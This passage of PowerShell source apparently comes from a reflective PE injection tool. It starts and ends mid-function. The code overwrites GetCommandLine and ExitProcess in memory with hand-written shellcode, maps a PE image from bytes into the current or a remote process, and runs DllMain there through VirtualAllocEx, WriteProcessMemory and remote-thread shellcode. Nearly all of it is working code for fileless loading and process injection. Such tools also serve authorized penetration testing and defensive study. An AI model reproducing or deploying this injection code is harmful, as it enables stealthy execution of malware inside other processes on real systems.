		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

